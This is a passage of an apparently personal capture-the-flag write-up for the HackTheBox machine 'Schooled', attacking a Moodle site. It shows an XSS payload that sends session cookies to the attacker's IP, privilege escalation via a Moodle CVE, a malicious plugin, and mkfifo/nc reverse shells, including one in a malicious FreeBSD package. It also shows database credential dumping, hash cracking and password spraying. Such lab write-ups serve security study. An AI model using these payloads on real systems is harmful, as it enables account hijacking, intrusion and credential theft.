    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://moodle.schooled.htb/ <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> curl -s http://schooled.htb <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">84</span>
</span></span><span class="line"><span class="cl"><span class="m">20750</span></span></span></code></pre>
</figure><h3 id="tcp-80---moodleschooledhtb">TCP 80 - moodle.schooled.htb</h3>
<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href="https://moodle.org/"target="_blank" rel="noopener noreferrer"
>Moodle LMS</a>, and there are four courses available here.</p>
<p><div class="img-container"><img src="imgs/image-20210518171919132.png" alt="image-20210518171919132"  /></div>
</p>
<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
<h4 id="account-register">Account Register</h4>
<p>To register an account I have to use the domain <code>student.schooled.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210518173537504.png" alt="image-20210518173537504"  /></div>
</p>
<p>I will change my email domain and login afterwards.</p>
<p>When I visit the domain <code>student.schooled.htb</code>, it returns the same site as <code>schooled.htb</code>.</p>
<h4 id="enroll-course">Enroll course</h4>
<p>Based on the login activity,  Manuel Phillips is the only teacher that seems to be active. So I will enroll to his course (it allows self-enroll).</p>
<p><div class="img-container"><img src="imgs/image-20210518174336502.png" alt="image-20210518174336502"  /></div>
</p>
<p>On the Mathematics course, there are two announcements .</p>
<p><div class="img-container"><img src="imgs/image-20210518175011420.png" alt="image-20210518175011420"  /></div>
</p>
<p>The oldest announcement by Jamie Borham is just a welcome message and the other titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips is a reminder for the students to set their MoodleNet profiles.</p>
<p><div class="img-container"><img src="imgs/image-20210518175100601.png" alt="image-20210518175100601"  /></div>
</p>
<p>The &ldquo;MoodleNet profile&rdquo; that Manuel Phillips was talking about can be found at <code>Dashboard -&gt; Preferences -&gt; User account -&gt; Edit profile</code> .</p>
<p><div class="img-container"><img src="imgs/image-20210518183135218.png" alt="image-20210518183135218"  /></div>
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<h4 id="exploit-db">Exploit-DB</h4>
<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
<ul>
<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting =&gt; Need a teacher or an administrator or a manager role.</li>
<li>Moodle 3.10.3 - &rsquo;label&rsquo; Persistent Cross Site Scripting =&gt; Worth to try.</li>
</ul>
<p><div class="img-container"><img src="imgs/image-20210518183748916.png" alt="image-20210518183748916"  /></div>
</p>
<h4 id="moodle-security">Moodle Security</h4>
<p>The other place to look for the Moodle vulnerabilities/security issues is on  <a href="https://moodle.org/security/"target="_blank" rel="noopener noreferrer"
>https://moodle.org/security/</a>. In there, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
<p><div class="img-container"><img src="imgs/image-20210518220404280.png" alt="image-20210518220404280"  /></div>
</p>
<p>Another one that looks promising is the privilege escalation from the teacher role into manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210520020814806.png" alt="image-20210520020814806"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-manuel-phillips">Access as Manuel Phillips</h3>
<h4 id="moodle-cve-2020-25627---stored-xss-via-moodlenet-profile">Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile</h4>
<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo;, which actually the hint to the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&amp;__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR"target="_blank" rel="noopener noreferrer"
>CVE-2020-25627</a>) vulnerability affected the MoodleNet profile. XSS attack is typically used to <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies"target="_blank" rel="noopener noreferrer"
>steal a user cookie session</a>. So in this case, I&rsquo;m going to steal Manuel Phillips&rsquo;s cookie.</p>
<p>First, I will setup a netcat listener on port 80, then I will edit my MoodleNet profile (<code>Dashboard &gt; Preferences &gt; User account &gt; Edit profile &gt; MoodleNet profile</code>) and change its value to the following payload:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nx">iamf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">iamf</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://10.10.14.49/?iamf=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre>
</figure><p>Or this one:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="s1">&#39;&#34; /&gt;&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></span></span></code></pre>
</figure><p><div class="img-container"><img src="imgs/image-20210520012522733.png" alt="image-20210520012522733"  /></div>
</p>
<p>After a few minutes, there is a request coming to my listener:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">80</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">26076</span>
</span></span><span class="line"><span class="cl">GET /?iamf<span class="o">=</span><span class="nv">MoodleSession</span><span class="o">=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 10.10.14.49
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
</span></span><span class="line"><span class="cl">Accept: image/webp,*/*
</span></span><span class="line"><span class="cl">Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=</span><span class="m">33</span></span></span></code></pre>
</figure><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
<p><div class="img-container"><img src="imgs/image-20210520013212895.png" alt="image-20210520013212895"  /></div>
</p>
<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
</p>
<p>Now I can confirm that this Moodle version is 3.9 by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="moodle-cve-2020-14321---teacher-role---manager-role">Moodle CVE-2020-14321 - Teacher role -&gt; Manager role</h4>
<p>This Moodle version is known to be vulnerable to the role privilege escalation (<code>CVE-2020-14321</code>) that allows escalation of privilege from teacher role (Manuel Phillips has teacher role) to manager role. With manager role, it is also possible to obtain code execution by installing a malicious plugin. I will be using this <a href="https://vimeo.com/441698193"target="_blank" rel="noopener noreferrer"
>walkthrough video</a> created by the researcher who found this vulnerability as my reference.</p>
<p>The first step is to join a teacher to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022325198.png" alt="image-20210520022325198"  /></div>
</p>
<p>I will choose Jamie Borham and enroll it to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022826655.png" alt="image-20210520022826655"  /></div>
</p>
<p>I will intercept the enroll request using Burp Suite and modify the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
<p><div class="img-container"><img src="imgs/image-20210520023902707.png" alt="image-20210520023902707"  /></div>
</p>
<p>On the course participants, I can see the manager role has been assigned to Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
</p>
<p>With manager role, I have the ability to impersonate my participants (they have to be on my course first) using &ldquo;Login as&rdquo; function. For example:</p>
<p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
</p>
<p>When I logged in as Lianne Carter, there is another menu called &ldquo;Site Administration&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210915221840588.png" alt="image-20210915221840588"  /></div>
</p>
<h4 id="malicious-plugin">Malicious Plugin</h4>
<p>Now to get RCE, I need to grant full permissions to manager role (from my understanding, Lianne Carter has site administrative capability and manager role).</p>
<p>I will head to <code>Site Administration</code> -&gt; <code>Users</code> -&gt; <code>Define roles</code> -&gt; <code>Manager</code> -&gt;  <code>Edit</code> to grant full permission to manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210915222952344.png" alt="image-20210915222952344"  /></div>
</p>
<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
<p><div class="img-container"><img src="imgs/image-20210915223616445.png" alt="image-20210915223616445"  /></div>
</p>
<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions"target="_blank" rel="noopener noreferrer"
>PoC</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915223955951.png" alt="image-20210915223955951"  /></div>
</p>
<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -&gt; <code>Plugins</code> -&gt; <code>Install plugins</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915224410922.png" alt="image-20210915224410922"  /></div>
</p>
<p>I will grab the malicious plugin from this repository: <a href="https://github.com/HoangKien1020/Moodle_RCE"target="_blank" rel="noopener noreferrer"
>https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915225327871.png" alt="image-20210915225327871"  /></div>
</p>
<p>I will just continue on the installation process.</p>
<p><div class="img-container"><img src="imgs/image-20210915230537390.png" alt="image-20210915230537390"  /></div>
</p>
<p>Once the plugin is installed, it can be accessed at <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]</code>:</p>
<p><div class="img-container"><img src="imgs/image-20210520034807810.png" alt="image-20210520034807810"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>Since it&rsquo;s FreeBSD, I will use the mkfifo payload to get a foothold.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol</span></span></code></pre>
</figure><p>On my listener:</p>
<p><div class="img-container"><img src="imgs/image-20210520041503270.png" alt="image-20210520041503270"  /></div>
</p>
<p>I will upgrade my shell.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ /usr/local/bin/python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">$ which stty
</span></span><span class="line"><span class="cl">which stty
</span></span><span class="line"><span class="cl">/bin/stty
</span></span><span class="line"><span class="cl">$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">0</span>
</span></span><span class="line"><span class="cl">$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">0</span>
</span></span><span class="line"><span class="cl">$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/usr/local/www/apache24/data/moodle/blocks/rce/lang/en</span></span></code></pre>
</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jamie">Shell as jamie</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are two users other than root who have a login shell: <strong>jamie</strong> and <strong>steve</strong>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:*:0:0:Charlie <span class="p">&amp;</span>:/root:/bin/csh
</span></span><span class="line"><span class="cl">jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
</span></span><span class="line"><span class="cl">steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
</span></span><span class="line"><span class="cl">$ ls -l /home/
</span></span><span class="line"><span class="cl">total <span class="m">17</span>
</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> jamie  jamie  <span class="m">11</span> Feb <span class="m">28</span> 18:13 jamie
</span></span><span class="line"><span class="cl">drwx------  <span class="m">5</span> steve  steve  <span class="m">14</span> Mar <span class="m">17</span> 14:05 steve</span></span></code></pre>
</figure><p>The Moodle configuration file is located under <code>/usr/local/www/apache24/data/moodle</code>, and it contains database credentials.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cat config.php 
</span></span><span class="line"><span class="cl">&lt;?php  // Moodle configuration file
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">unset<span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">global <span class="nv">$CFG</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">&#39;native&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">&#39;PlaybookMaster2020&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">&#39;mdl_&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;dbpersist&#39;</span> <span class="o">=</span>&gt; 0,
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;dbport&#39;</span> <span class="o">=</span>&gt; 3306,
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;dbsocket&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;dbcollation&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8_unicode_ci&#39;</span>,
</span></span><span class="line"><span class="cl"><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">&#39;http://moodle.schooled.htb/moodle&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">&#39;/usr/local/www/apache24/moodledata&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">require_once<span class="o">(</span>__DIR__ . <span class="s1">&#39;/lib/setup.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// There is no php closing tag in this file,
</span></span><span class="line"><span class="cl">// it is intentional because it prevents trailing whitespace problems!</span></span></code></pre>
</figure><h4 id="mysql">MySQL</h4>
<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ /usr/local/bin/mysql moodle -u moodle -p<span class="s1">&#39;PlaybookMaster2020&#39;</span>
</span></span><span class="line"><span class="cl">mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
</span></span><span class="line"><span class="cl">Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span></span><span class="line"><span class="cl">Your MySQL connection id is <span class="m">7517</span>
</span></span><span class="line"><span class="cl">Server version: 8.0.23 Source distribution
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span class="line"><span class="cl">affiliates. Other names may be trademarks of their respective
</span></span><span class="line"><span class="cl">owners.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; </span></span></code></pre>
</figure><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; <span class="k">select</span> username,password from mdl_user<span class="p">;</span>
</span></span><span class="line"><span class="cl">+-------------------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> username          <span class="p">|</span> password                                                     <span class="p">|</span>
</span></span><span class="line"><span class="cl">+-------------------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> guest             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> admin             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class="p">|</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="p">|</span> iamf              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class="p">|</span>
</span></span><span class="line"><span class="cl">+-------------------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="m">33</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; </span></span></code></pre>
</figure><p>There are a lot of hashes to recover, but I will focus on the admin hash first.</p>
<h4 id="hash-crack">Hash crack</h4>
<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:&#39;</span> rockyou.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
</span></span><span class="line"><span class="cl">Time.Started.....: Thu May <span class="m">20</span> 05:04:20 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> min, <span class="m">25</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Time.Estimated...: Thu May <span class="m">20</span> 05:05:45 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>../rockyou.txt<span class="o">)</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...</span></span></code></pre>
</figure><h4 id="password-spray">Password Spray</h4>
<p>With password spray attack, it reveals that the password is reused by user <strong>jamie</strong> for SSH login.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> jamie:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>+<span class="o">]</span> jamie:!QAZ2wsx 
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span></span></span></code></pre>
</figure><h4 id="ssh">SSH</h4>
<p>Now I can login as jamie via SSH.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ ssh jamie@10.10.10.234
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> jamie@Schooled:
</span></span><span class="line"><span class="cl">Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
</span></span><span class="line"><span class="cl">FreeBSD 13.0-BETA3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c1">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">jamie@Schooled:~ $ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span></span></span></code></pre>
</figure><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jamie@Schooled:~ $ sudo -l
</span></span><span class="line"><span class="cl">User jamie may run the following commands on Schooled:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg install *</span></span></code></pre>
</figure><p>According to <a href="https://gtfobins.github.io/gtfobins/pkg/"target="_blank" rel="noopener noreferrer"
>GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href="https://github.com/jordansissel/fpm"target="_blank" rel="noopener noreferrer"
>installed</a> first.</p>
<h4 id="installing-a-malicious-package">Installing a Malicious Package</h4>
<p>Using reference from GTFOBins, I can create a malicious package that contains a reverse shell</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class="nv">$TF</span>/x.sh<span class="p">;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
</span></span><span class="line"><span class="cl">DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class="c1">#finish to prevent that.</span>
</span></span><span class="line"><span class="cl">/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class="sb">`</span>initialize<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
